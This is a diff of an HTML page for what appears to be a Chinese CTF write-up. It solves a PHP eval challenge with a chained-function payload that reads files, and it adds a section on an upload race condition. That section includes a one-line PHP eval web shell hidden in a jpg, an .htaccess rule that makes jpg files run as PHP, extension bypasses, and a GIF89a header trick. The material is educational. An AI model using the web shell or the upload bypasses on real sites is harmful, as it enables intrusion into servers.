@@ -100,7 +100,7 @@
           <!-- Date -->
           <span class="date-time info">On
             <span class="date">2019-12-25</span>
-            <span class="time">08:10:13</span>
+            <span class="time">06:20:23</span>
           </span>
           
           <!--  Categories  -->
@@ -160,6 +160,7 @@
 <pre><code class="hljs undefined">"; if(isset($_GET['exp']))&#123; if (!preg_match('/data:<span class="hljs-symbol">\/</span><span class="hljs-symbol">\/</span>|filter:<span class="hljs-symbol">\/</span><span class="hljs-symbol">\/</span>|php:<span class="hljs-symbol">\/</span><span class="hljs-symbol">\/</span>|phar:<span class="hljs-symbol">\/</span><span class="hljs-symbol">\/</span>/i', $_GET['exp'])) &#123; if(';' === preg_replace('/[a-z|<span class="hljs-symbol">\-</span>]+<span class="hljs-symbol">\(</span>(?R)?<span class="hljs-symbol">\)</span>/', NULL, $_GET['exp'])) &#123; if (!preg_match('/et|na|nt|info|dec|bin|hex|oct|pi|log/i', <span class="hljs-keyword">$code)) &#123; // echo $_GET['exp']; eval</span>($_GET['exp']); &#125; else&#123; die("还差一点哦！"); &#125; &#125; else&#123; die("再好好想想！"); &#125; &#125; else&#123; die("还想读flag，臭弟弟！"); &#125; &#125; // highlight_file(__FILE__); ?&gt;</code></pre>
 
 <p>首先这道题过掉了所有的协议，这很给力。<br>重点看这个正则匹配(?R)说明我们只能用小括号匹配<br>我们重点首先访问当前目录<br><code>print_r(scandir(&#39;.&#39;));</code><br>但是这个.我们被匹配掉了<br>所以只能构造函数了<br><code>?exp=print_r(scandir(current(localeconv())));</code><br><img src="https://img-blog.csdnimg.cn/20200113100451692.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMjM1NDA2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现得到其中的文件，php有两个函数<br>array_flip,php官方文档是这么解释的<br><code>array_flip() 函数用于反转/交换数组中的键名和对应关联的键值。</code><br>重点是下一个函数<br><code>array_rand()函数返回数组中的随机键名，或者如果您规定函数返回不只一个键名，则返回包含随机键名的数组。</code><br>所以我们就可以构造如下payloads<br><code>highlight_file(array_rand(array_flip(scandir(current(localeconv())))));</code><br>这题看运气，随机到flag…..<br><img src="https://img-blog.csdnimg.cn/20200113100506217.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzMjM1NDA2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h1 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h1><p>这题是上传jpg和htaccess文件后几秒钟就删除了<br>解释一下htaccess文件,这是php用来解析各种文件的,这里用来解析jpg<br>但是，对于绕过php后缀名也有一些方法，比如以下几个后缀也是可以被解析的： php2，php3、php4、php5、phtml、phtm<br>为了让php能够解析jpg,我们可以在jpg前面加上php5%00,一般可以用phtml.但是有的会过滤ph<br>所以我们只能上传htaccess<br>jpg里写,为了能识别出php盲猜可能是检测了文件开头的的形式<br><code>&lt;script language=&quot;php&quot;&gt;@eval($_POST[&#39;disshu&#39;]);&lt;/script&gt;</code><br>htaccess里面写<br><code>AddType application/x-httpd-php .jpg</code><br>然后不停发包<br>还有那种用gif绕过<br>GIF89a前缀得加上</p>
 
         </div>
       </div>
